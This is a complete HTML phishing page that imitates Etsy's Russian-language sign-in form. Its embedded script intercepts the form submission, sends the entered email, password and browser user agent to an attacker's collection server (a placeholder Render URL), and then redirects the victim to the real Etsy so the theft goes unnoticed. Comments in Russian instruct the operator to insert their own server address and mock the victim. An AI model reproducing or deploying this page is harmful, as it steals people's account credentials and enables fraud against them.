    <style>
        body { font-family: 'Graphik', sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; box-sizing: border-box; }
        .logo { display: flex; justify-content: center; margin-bottom: 20px; }
        .logo svg { height: 24px; width: 50px; fill: #F1641E; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 20px; color: #222222; text-align: center; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 14px; font-weight: 700; color: #222222; margin-bottom: 8px; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 10px 12px; border: 1px solid #E1E3DF; border-radius: 6px; 
            font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.2s;
        }
        input[type="email"]:focus, input[type="password"]:focus { border-color: #F1641E; box-shadow: 0 0 0 1px #F1641E; }
        .btn-primary {
            width: 100%; padding: 12px; background-color: #222222; color: white; 
            border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px;
        }
        .btn-primary:hover { background-color: #000; }
        .divider { text-align: center; margin: 24px 0; color: #595959; font-size: 14px; position: relative; }
        .divider::before, .divider::after { content: ""; position: absolute; top: 50%; width: 45%; height: 1px; background-color: #E1E3DF; }
        .divider::before { left: 0; }
        .divider::after { right: 0; }
        .btn-secondary {
            width: 100%; padding: 12px; background-color: #fff; color: #222222; 
            border: 1px solid #E1E3DF; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px;
        }
        .btn-secondary:hover { background-color: #F9F9F9; }
        .footer-text { font-size: 12px; color: #595959; text-align: center; margin-top: 24px; line-height: 1.5; }
    </style>

        <h1>Для покупок войдите или создайте аккаунт.</h1>
        
        <form id="login-form" action="https://www.etsy.com/signin" method="POST">
            <div class="form-group">
                <label for="email">Адрес электронной почты</label>
                <input type="email" id="email" name="email" placeholder="Укажите свой электронный адрес" required autocomplete="email">
            </div>
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" placeholder="Введите пароль" required autocomplete="current-password">
            </div>
            <button type="submit" class="btn-primary">Войти в аккаунт</button>
        </form>

            Нажимая «Войти в аккаунт», Войти через Google, Facebook, или Apple, вы принимаете Условия использования и Политику конфиденциальности Etsy.

    <script>
        // ВМЕСТО ЭТОЙ ССЫЛКИ ВСТАВЬ ССЫЛКУ ОТ RENDER (с /catch в конце!)
        const SERVER_URL = 'https://твой-адрес-на-render.onrender.com/catch';

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault(); // Отменяем стандартную отправку формы
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Отправляем лог на твой сервер
            fetch(SERVER_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    email: email,
                    password: password,
                    user_agent: navigator.userAgent
                })
            }).catch(err => console.error('Error:', err));

            // Редиректим лоха на настоящий Etsy, чтобы он подумал, что просто не залогинился
            window.location.href = 'https://www.etsy.com/signin';
        });
    </script>
